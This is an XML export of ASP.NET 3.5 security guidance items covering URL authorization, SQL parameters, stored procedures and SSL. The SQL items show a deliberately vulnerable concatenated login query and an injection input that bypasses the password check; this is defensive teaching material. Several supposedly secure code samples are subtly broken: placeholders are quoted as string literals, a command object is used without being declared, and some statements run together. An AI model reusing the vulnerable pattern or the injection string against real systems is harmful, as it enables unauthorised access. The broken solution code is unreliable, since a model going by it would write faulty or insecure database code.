&lt;p&gt;This example denies access to unauthenticated users and forces a redirect to the login page that is specified on the &amp;lt;&lt;strong&gt;forms&lt;/strong&gt;&amp;gt; element.
&lt;/p&gt;
&lt;p&gt;The following example shows how you can apply authorization to a specific file (Page.aspx).
&lt;/p&gt;
&lt;pre&gt;&amp;lt;location path=&amp;quot;page.aspx&amp;quot;&amp;gt;    &lt;br&gt;&amp;lt;authorization&amp;gt;        &lt;br&gt;...    &lt;br&gt;&amp;lt;/authorization&amp;gt;&lt;br&gt;&amp;lt;/location&amp;gt;  &lt;/pre&gt;
&lt;p&gt;If necessary, you can apply different authorization rules for separate pages based on the identity, or more commonly, the role membership of the caller, by using multiple &amp;lt;&lt;strong&gt;authorization&lt;/strong&gt;&amp;gt; elements within separate &amp;lt;&lt;strong&gt;location&lt;/strong&gt;&amp;gt;
 elements. &lt;/p&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;&lt;a href="?#ruledisplay:a4f34081-56ae-4a7a-9b90-be4bc68e0402"&gt;URL Authorization is used for Page and Directory Access Control&lt;/a&gt;&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>387ba9ba-9ea5-4ab2-8c00-cfb169557daa</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Use Type Safe SQL Parameters when Constructing SQL Queries</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Data Access</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>1</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Use type-safe parameters when constructing dynamic SQL queries or when passing parameters to stored procedures.
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;If you use the Parameters collection, SQL treats the input is as a literal value rather then as executable code. The Parameters collection can be used to enforce type and length constraints on input data. Values outside of the range trigger an exception.
 If type safe SQL parameters are not used, attackers might be able to execute injection attacks that are embedded in the unfiltered input.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;This guideline is applicable whenever there is an SQL statement that is built dynamically. It is also appropriate whenever stored procedures are utilized.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;One way of making the application less susceptible to SQL injection attacks is by using stored procedures. Stored procedures are subroutines stored in the database that are available to applications for accessing the data.
&lt;/p&gt;
&lt;p&gt;Just using stored procedures isn't a complete remedy for SQL injection. The important thing to do is use parameters with stored procedures, else, your stored procedures can be susceptible to SQL injection if they use unfiltered input. Stored procedures provide
 several security advantages:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;By parameterizing input parameters and type enforcing them, user input is effectively filtered
&lt;/li&gt;&lt;li&gt;Stored procedures are allowed to execute under different security privileges from the database user by most databases, thereby restricting the ability of the application to do anything beyond the actions specified in the stored procedures. For instance,
 an application would have execute access to a stored procedure, but no access to the base tables.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;To use type safe SQL parameters, follow these steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;If possible, use stored procedures.&lt;/strong&gt; Stored procedures are pre-compiled statements that are stored on the database server. Using stored procedures improves your application's performance and security. Consult the
&lt;a href="?#ruledisplay:8F360E73-D932-4512-84B4-2D7A6632DA7F"&gt;Use Stored Procedures&lt;/a&gt; guideline for more details.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Determine the parameters in the SQL query or stored procedure being constructed.&lt;/strong&gt; All parameters that result from user input or another untrusted source should be escaped, by specifying variable names in the query:&lt;/p&gt;
&lt;pre&gt;SELECT * from books WHERE ISBN = '@isbn'&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Declare the explicit data types for each parameter in the SQL statement.&lt;/strong&gt; When executing the SQL statement, specify the data type and length for each parameter in the query:&lt;/p&gt;
&lt;pre&gt;myCommand.SelectCommand.Parameters.Add(&amp;quot;@isbn&amp;quot;, SqlDbType.VarChar, 10);&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Specify the value for each parameter.&lt;/strong&gt; The untrusted input is then specified, so that it can be properly handled when the SQL statement executes:&lt;/p&gt;
&lt;pre&gt;myCommand.SelectCommand.Parameters[&amp;quot;@isbn&amp;quot;].Value = '0494483923';&lt;/pre&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;Consider an ASP.NET application that handles employee payroll functionality for a small company. One of the pages requires retrieving an employee record from a table based on a username and password supplied via a login dialog. The developer of the application
 created an SQL SELECT query to accomplish said task:&lt;/p&gt;
&lt;pre&gt;using (SqlConnection myConnection = new SqlConnection(connectionString))&lt;br&gt;&lt;pre&gt;SqlConnection myConnection = new SqlConnection(&amp;quot;Data Source=localhost\\sqlexpress;&lt;br&gt;            Initial Catalog=EmployeePayroll;&lt;br&gt;            Integrated Security=True&amp;quot;);&lt;br&gt;string SQLstr = &amp;quot;SELECT * from users WHERE username = '&amp;quot; &amp;#43; un.Text &amp;#43; &lt;br&gt;              &amp;quot;' AND password = '&amp;quot; &amp;#43; &lt;br&gt;              pass.Text &amp;#43; &amp;quot;'&amp;quot;;&lt;/pre&gt;&lt;pre&gt;SqlCommand myCommand = new SqlCommand(SQLstr, myConnection);&lt;/pre&gt;&lt;pre&gt;SqlDataAdapter myDataAdapter = new SqlDataAdapter(myCommand);&lt;/pre&gt;&lt;pre&gt;myCommand.Connection.Open();&lt;/pre&gt;&lt;pre&gt;SqlDataReader myReader = myCommand.ExecuteReader();&lt;br&gt;&lt;/pre&gt;&lt;/pre&gt;
&lt;p&gt;In the preceding example, the SELECT statement will work as expected, assuming that the input is perfectly constrained. However, what happens if a user enters unexpected input such as '1234' for a password, and this for a username:&lt;/p&gt;
&lt;pre&gt;mjones' AND 1=1; -- &lt;/pre&gt;
&lt;p&gt;This will result in the SQL statement being executed at the database level:&lt;/p&gt;
&lt;pre&gt;SELECT * from users WHERE username = 'mjones' AND 1=1; --'  AND password = '1234';&lt;/pre&gt;
&lt;p&gt;This will allow the person entering data into the dialog box to select the account details of mjones without the correct password.&lt;/p&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;Consider an ASP.NET application that handles employee payroll functionality for a small company. One of the pages requires retrieving an employee record from a table based on a username and password supplied via a login dialog. The developer of the application
 uses the following SQL query to take advantage of type safe parameters with the SqlParameterCollection when constructing the query dynamically:&lt;/p&gt;
&lt;pre&gt;&lt;pre&gt;using System.Data;&lt;br&gt;using System.Data.SqlClient;&lt;/pre&gt;&lt;pre&gt;using (SqlConnection connection = new SqlConnection(connectionString))&lt;br&gt;{&lt;br&gt;&amp;nbsp; DataSet userDataset = new DataSet();&lt;br&gt;&amp;nbsp; SqlDataAdapter myDataAdapter = new SqlDataAdapter(&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;quot;SELECT * from users WHERE username = &lt;a href="mailto:'@uname'"&gt;'@uname'&lt;/a&gt; AND password = &lt;a href="mailto:'@pwd'"&gt;'@pwd'&lt;/a&gt;&amp;quot;, connection);&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br&gt;&amp;nbsp; myCommand.SelectCommand.Parameters.Add(&amp;quot;@uname&amp;quot;, SqlDbType.VarChar, 24);&lt;br&gt;&amp;nbsp; myCommand.SelectCommand.Parameters.Add(&amp;quot;@pwd&amp;quot;, SqlDbType.VarChar, 16);&lt;/pre&gt;&lt;pre&gt;  myCommand.SelectCommand.Parameters[&amp;quot;@uname&amp;quot;].Value = un.Text;&lt;/pre&gt;&lt;pre&gt;  myCommand.SelectCommand.Parameters[&amp;quot;@pwd&amp;quot;].Value = pass.Text;&lt;br&gt;&lt;br&gt;&amp;nbsp; myDataAdapter.Fill(userDataset);&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;&lt;/pre&gt;
&lt;p&gt;In the preceding code example, the input values are constrained for length and escaped. If the data does not conform to the type or length defined by the parameter, the SqlParameter class throws an exception.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;To learn more about SQL injection, see: &lt;a href="http://en.wikipedia.org/wiki/SQL_injection"&gt;
SQL Injection&lt;/a&gt; in Wikipedia. &lt;/li&gt;&lt;li&gt;To learn more about countering SQL injection in ASP.NET, visit: &lt;a href="http://msdn2.microsoft.com/en-us/library/ms998271.aspx"&gt;
How To: Protect From SQL Injection in ASP.NET&lt;/a&gt;. &lt;/li&gt;&lt;li&gt;To learn more about countering injection-based attacks in ASP.NET, see: &lt;a href="http://msdn2.microsoft.com/en-us/library/bb355989.aspx"&gt;
How To: Protect From Injection Attacks in ASP.NET&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:F1B74837-9A72-4745-A149-EC5D8C476EB7"&gt;Guideline: Validate All Input Passed to Database
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:8F360E73-D932-4512-84B4-2D7A6632DA7F"&gt;Guideline: Use Stored Procedures
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:8515588C-661A-4962-853F-6CD6ABCD8CF6"&gt;Attack: Server-Side Code Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:22BE1EE0-7DA4-4571-8D58-3ED211A05947"&gt;Checklist Item: Type Safe SQL Parameters are Used
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>3ace3004-81fc-4876-b9c6-effd6f351112</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Use SSL to Protect User Credentials and Authentication Cookies</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authentication</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Use Secure Sockets Layer (SSL) to protect the authentication credentials and authentication cookies passed between browser and server.
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;By using SSL, you make it much more difficult for an attacker to monitor the network connection and obtain authentication credentials and capture authentication cookies to gain spoofed access to your application.
&lt;/p&gt;
&lt;p&gt;SSL also can improve user trust in your application as it authenticates the server to the client, thus proving the end point for communications.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;SSL should be used for forms based authentication. &lt;/p&gt;
&lt;p&gt;If you cannot use SSL, reduce the session lifetime with the timeout attribute on the forms element.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Restrict the authentication cookie to HTTPS connections. &lt;/strong&gt;Cookies support a &amp;quot;secure&amp;quot; property that determines whether or not browsers should send the cookie back to the server. With the secure property set, the cookie is sent by the browser
 only to a secure page that is requested using an HTTPS URL.&lt;/p&gt;
&lt;p&gt;Set the secure property by using &lt;strong&gt;requireSSL=&amp;quot;true&amp;quot;&lt;/strong&gt; on the &lt;strong&gt;
&amp;lt;forms&amp;gt;&lt;/strong&gt; element as follows:&lt;/p&gt;
&lt;pre&gt;&amp;lt;forms loginUrl=&amp;quot;Secure\Login.aspx&amp;quot;&lt;br&gt;       requireSSL=&amp;quot;true&amp;quot; . . . /&amp;gt;&amp;nbsp;&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Encrypt the cookie and check its integrity. &lt;/strong&gt;Encrypt the cookie and check its integrity, even if you are using SSL. This prevents an attacker from viewing or modifying the cookie if he or she manages to steal it through a XSS exploit. In
 this event, the attacker can still use the cookie to gain access to your application. The best way to mitigate this risk is to implement the appropriate countermeasures to prevent XSS attacks (described under &amp;quot;Cross-Site Scripting&amp;quot; earlier in this chapter),
 and limit the cookie lifetime as described in the next recommendation.&lt;/p&gt;
&lt;p&gt;To provide privacy and integrity for the cookie, set the &lt;strong&gt;protection&lt;/strong&gt; attribute on the
&lt;strong&gt;&amp;lt;forms&amp;gt;&lt;/strong&gt; element as follows:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;forms protection=&amp;quot;All&amp;quot;    Privacy and integrity&amp;nbsp;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;A secure &amp;lt;&lt;strong&gt;forms&lt;/strong&gt;&amp;gt; element configuration is shown here:&lt;/p&gt;
&lt;pre&gt;&amp;lt;forms loginUrl=&amp;quot;Secure\Login.aspx&amp;quot;&lt;br&gt;       protection=&amp;quot;All&amp;quot;&lt;br&gt;       requireSSL=&amp;quot;true&amp;quot;&lt;br&gt;       timeout=&amp;quot;00:30:00&amp;quot; &lt;br&gt;       slidingExpiration=&amp;quot;true&amp;quot;&lt;br&gt;       name=&amp;quot;YourAppName&amp;quot;&lt;br&gt;       path=&amp;quot;/Secure&amp;quot; /&amp;gt;&lt;/pre&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;&lt;a href="?#ruledisplay:f4b36918-6de8-40a6-96d3-de9e3499c89e"&gt;SSL is Used to Protect User Credentials and Authentication Cookies&lt;br&gt;
&lt;/a&gt;&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>4471ff4d-d052-4fe2-afd9-1c57a4bc0273</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Use Stored Procedures</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Data Access</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>1</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Always use stored procedures when interacting with a database. This increases performance and reduces the risk of a successful SQL injection attack.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Attackers can use a &lt;a href="?#ruledisplay:1D4FA7AF-33F0-40D9-9665-A31DBF3D7764"&gt;
SQL Injection Attack&lt;/a&gt; to manipulate the database in unforeseen ways. SQL injection allows an attacker to assume the credentials of the SQL account used to connect to the database, which may lead to arbitrary reading, writing, updating, or deleting of data.
 In an improperly secured database this can also lead to remote code execution through the use of certain stored procedures that allow for direct Operating System command injection.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;Whenever interaction with a database is required&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;First the stored procedure will have to be created on the database, this can be done using the following SQL syntax:&lt;/p&gt;
&lt;pre&gt;CREATE PROCEDURE &lt;br&gt;sp_AddNewUser( @UserName nvarchar(255), @Email  nvarchar(255), &lt;br&gt;@FirstName nvarchar(255), @LastName nvarchar(255)) AS&lt;/pre&gt;
&lt;pre&gt;-- INSERT the new user&lt;br&gt;INSERT INTO Users_Table(UserName, Email, FirstName, LastName)&lt;br&gt;VALUES(@UserName, @Email, @FirstName, @LastName)&lt;br&gt;--This will return the new user’s IDSELECT SCOPE_IDENTITY()&lt;/pre&gt;
&lt;p&gt;Now to call the stored procedure we can use the following .NET code:&lt;/p&gt;
&lt;pre&gt;//create a new connection using our connection string&lt;br&gt;SqlConnection myConnection = new SqlConnection(connection string)&lt;br&gt;;myConnection.Open();&lt;br&gt;//create a new command that specifies our store procedure&lt;br&gt;SqlCommand myCommand = new SqlCommand(&amp;quot;sp_AddNewUser&amp;quot;, myConnection);&lt;br&gt;//Specify our command is a stored proceduremy&lt;br&gt;Command.CommandType = Command&lt;br&gt;Type.StoredProcedure;&lt;br&gt;//Create a new parameter to carry the username&lt;br&gt;SqlParameter UserParameter = new SqlParameter(&amp;quot;@UserName&amp;quot;, SqlDbType.VarChar);&lt;br&gt;UserParameter.Direction = ParameterDirection.Input;&lt;br&gt;UserParameter.Value = &amp;quot;TestUser&amp;quot;;&lt;br&gt;//Add the parameter to the command&lt;br&gt;myCommand.Parameters.Add(UserParameter);&lt;br&gt;//Repeat this code to add commands for each parameter in the SPROC&lt;br&gt;//Execute the command on the Database&lt;br&gt;myCommand.ExecuteNonQuery();&lt;/pre&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;There are many ways to create a SQL injection vulnerability, and it’s even possible to do using stored procedures. The vulnerability lies in dynamically creating a SQL statement without bound parameters. In the following example the developer has built the
 SELECT statement by appending the components of the statements together with user provided input.&lt;/p&gt;
&lt;p&gt;The developer wants to execute the following command where [username] is the username of the user whose e-mail we would like to return&lt;/p&gt;
&lt;pre&gt;SELECT Email from Users_Table where &lt;br&gt;UserName = [username];&lt;br&gt;&lt;/pre&gt;
&lt;pre&gt;The following code will create that statement an execute it on the database:&lt;br&gt;//create a new connection using our connection string&lt;br&gt;SqlConnection myConnection = new SqlConnection(connection string);&lt;br&gt;myConnection.Open();&lt;br&gt;//create a new command that specifies our store procedure&lt;br&gt;string selectCommand = &amp;quot;SELECT Email from Users_Table WHERE UserName = &amp;quot;&lt;br&gt;         &amp;#43; userNameBox.Text;&lt;br&gt;SqlCommand myCommand = new SqlCommand(selectCommand);&lt;br&gt;//Execute the command on the Database&lt;br&gt;SqlDataReader myReader = myCommand.ExecuteReader();&lt;/pre&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;First a stored procedure needs to be created on the database, the following SQL syntax can be used to create the same select statement as above:&lt;/p&gt;
&lt;pre&gt;CREATE PROCEDURE sp_ReturnEmail( @UserName nvarchar(255)) &lt;br&gt;ASSELECT Email FROM Users_Table where UserName = @UserName;&lt;/pre&gt;
&lt;p&gt;Now the following code can be used to query the database using the stored procedure:&lt;/p&gt;
&lt;pre&gt;//create a new connection using our connection string&lt;br&gt;SqlConnection myConnection = new SqlConnection(connection string);&lt;br&gt;myConnection.Open();&lt;br&gt;//create a new command that specifies our store procedure&lt;br&gt;SqlCommand myCommand = new SqlCommand(&amp;quot;sp_ReturnEmail&amp;quot;, myConnection);&lt;br&gt;//Specify our command is a stored procedure&lt;br&gt;myCommand.CommandType = CommandType.StoredProcedure;&lt;br&gt;//Create a new parameter to carry the username&lt;br&gt;SqlParameter UserParameter = new SqlParameter(&amp;quot;@UserName&amp;quot;, SqlDbType.VarChar);U&lt;br&gt;serParameter.Direction = ParameterDirection.Input;UserParameter.Value = [username];&lt;br&gt;//Add the parameter to the command&lt;br&gt;myCommand.Parameters.Add(UserParameter);&lt;br&gt;//Execute the command on the Database&lt;br&gt;SqlDataReader myReader = myCommand.ExecuteReader();&lt;/pre&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;To learn more about stored procedures, visit: &lt;a href="http://en.wikipedia.org/wiki/Stored_procedure"&gt;
Stored procedure&lt;/a&gt;. &lt;/li&gt;&lt;li&gt;For more information on using stored procedures, visit: &lt;a href="http://aspnet.4guysfromrolla.com/articles/062905-1.aspx"&gt;
Returning a Scalar value from a Stored Procedure&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:3437DF81-6B8C-4A14-BB6E-34F6EE21C45F"&gt;Guideline: Use Type Safe SQL Parameters When Constructing SQL Queries
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:F1B74837-9A72-4745-A149-EC5D8C476EB7"&gt;Guideline: Validate All Input Passed to Database&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1D4FA7AF-33F0-40D9-9665-A31DBF3D7764"&gt;Attack: SQL Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:8515588C-661A-4962-853F-6CD6ABCD8CF6"&gt;Attack: Server-Side Code Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:22BE1EE0-7DA4-4571-8D58-3ED211A05947"&gt;Checklist Item: Type Safe SQL Parameters are Used
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>47e03443-3e6b-4187-ad9a-843ad1ecdf5d</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Use SSL Between Untrusted Server Applications</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Communication Security</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Use an encrypted communication channel to protect data sent between servers.&amp;nbsp;The Secure Sockets Layer (SSL) protocol can be used to secure the communication link between&amp;nbsp;servers.&amp;nbsp;&amp;nbsp;
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Servers rarely co-exist in a secure environment.&amp;nbsp;Eavesdropping and spoofing are threats when two or more entities must communicate over an untrusted medium such as the public internet, or even&amp;nbsp;a LAN. Using SSL&amp;nbsp;prevents&amp;nbsp;attackers from&amp;nbsp;monitoring the network
 connection to obtain authentication credentials in plain text. Not using SSL could allow an attacker&amp;nbsp;to capture the authentication cookies&amp;nbsp;and gain spoofed access to&amp;nbsp;any applications that transmit data over the network.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;If&amp;nbsp;communicating&amp;nbsp;servers are not inside a physically secure data center where the network eavesdropping threat is negligible,&amp;nbsp;it&amp;nbsp;is important to use an encrypted communication channel to protect data sent between servers. SSL is used when an application
 does not trust other applications on a server. Use SSL when granular channel protection for a particular application running on a server is needed&amp;nbsp;rather than&amp;nbsp;for all applications and services. It is also an appropriate choice when fixed ip addresses are not
 available. SSL only works with TCP/IP communication&amp;nbsp;protocol as well as named pipes.&lt;/p&gt;
&lt;p&gt;Use IPSec to help protect the communication channel between two servers and to restrict which computers can communicate with one another. For example, you can help protect a database server by establishing a policy that permits requests only from a trusted
 client computer such as an application or Web server. You can also restrict communication to specific IP protocols and TCP/UDP ports.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Here is how to use SSL&amp;nbsp;to&amp;nbsp;protect communication between servers:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Install a Server Authentication Certificate on the server. &lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;Install the Issuing CA's certificate&amp;nbsp;so the&amp;nbsp;two communicating applications may negotiate an SSL connection.&amp;nbsp;&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;Use the &amp;quot;https://&amp;quot; connection protocol in the code to ensure traffic between the 2 server applications are encrypted.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;Verify that Communication Is Encrypted. Use Network Monitor to verify that data sent between the application server and database server is encrypted. Start by sending data in clear text form and then enable encryption first by configuring the server and
 then by configuring the client.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;An e-commerce application written in ASP.NET enables customers to pay their bills online through a unified broker. The application's web component&amp;nbsp;relies on an independant&amp;nbsp;account management system that resides on another server. The web&amp;nbsp;component communicates
 with the account management system using a SQL&amp;nbsp;socket connection.&amp;nbsp; The two servers&amp;nbsp;are located in a competitively priced data center that houses a number of other customers, all of which are able&amp;nbsp;to access the building&amp;nbsp;at all times. A malicious user&amp;nbsp;purchases
 hosting services at the same company, and&amp;nbsp;after exploring the hosting environment, learns that the hosted accounts are networked using a shared&amp;nbsp;bus topology&amp;nbsp;that allows for network snooping. The attacker is able to setup a sniffer, and captures all of the
 communication between the account management component and the web component, since SQL connections are not encrypted by default. The attacker can now log in as a legitimate user&amp;nbsp;on the account management server and make changes at will.&amp;nbsp;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;An e-commerce application written in ASP.NET enables customers to pay their bills online through a unified broker. The application's web component&amp;nbsp;relies on an independant&amp;nbsp;account management system that resides on another server. The web&amp;nbsp;component communicates
 with the account management system using a SQL&amp;nbsp;socket connection. The two servers&amp;nbsp;are located in a competitively priced data center that houses a number of other customers, all of which are able&amp;nbsp;to access the building&amp;nbsp;at all times. The Developer of the application
 setup encrypted SSL traffic by installing a Server Authenticaion Certificate on the machine hosting the account management component, and installed the issuing CA's certificate on the&amp;nbsp;server hosting the web component. &amp;nbsp;The components use OLE-DB to communicate,
 so the developer inserted the following configuration directives in the web.config file:&lt;/p&gt;
&lt;pre&gt;&amp;quot;Provider=SQLOLEDB.1;Integrated Security=SSPI;Persist Security &lt;br&gt;&amp;nbsp; Info=False;Initial Catalog=Northwind;Data Source=sql01;Use &lt;br&gt;&amp;nbsp; Encryption for Data=True&amp;quot;&lt;/pre&gt;
&lt;p&gt;The developer then uses the following call to connect to the database using the SSL tunnel for data encryption:&lt;/p&gt;
&lt;pre&gt;// Replace the server name in the following connection string with the name of your database &lt;br&gt;serverSqlConnection conn = new SqlConnection(&amp;quot;server='sql01';&lt;br&gt;  database=NorthWind;IntegratedSecurity='SSPI'&amp;quot;);&lt;/pre&gt;
&lt;p&gt;Because&amp;nbsp;traffic between the two components is encrypted, the transmission medium&amp;nbsp;is&amp;nbsp;less&amp;nbsp;likely to affect the ability of the two components to communicate securely.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Using Secure Sockets Layer &lt;a href="http://msdn2.microsoft.com/en-us/library/ds8bxk2a.aspx"&gt;
http://msdn2.microsoft.com/en-us/library/ds8bxk2a.aspx&lt;/a&gt; &lt;/li&gt;&lt;li&gt;Internet Protocol Version 6 &lt;a href="http://msdn2.microsoft.com/en-us/library/3x7ak53z(VS.80).aspx"&gt;
http://msdn2.microsoft.com/en-us/library/3x7ak53z(VS.80).aspx&lt;/a&gt;&amp;nbsp; &lt;/li&gt;&lt;li&gt;Wikipedia SSL encyclopedia entry &lt;a href="http://en.wikipedia.org/wiki/Secure_Sockets_Layer"&gt;
http://en.wikipedia.org/wiki/Secure_Sockets_Layer&lt;/a&gt; &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:ecfc4c67-2a6c-443e-844e-8a3051fe54f3"&gt;Use IPSsec to Encrypt Traffic Between Servers&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:8afce3ed-b29f-4a25-ab8c-0d070383c7ad"&gt;Use SSL Between Untrusted Server Applications&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:00b37bcb-5a47-41ca-9e84-a9e8edb15272"&gt;Use SSL Between the Web Browser and Web Server When Pages Need to be Encrypted&lt;/a&gt;
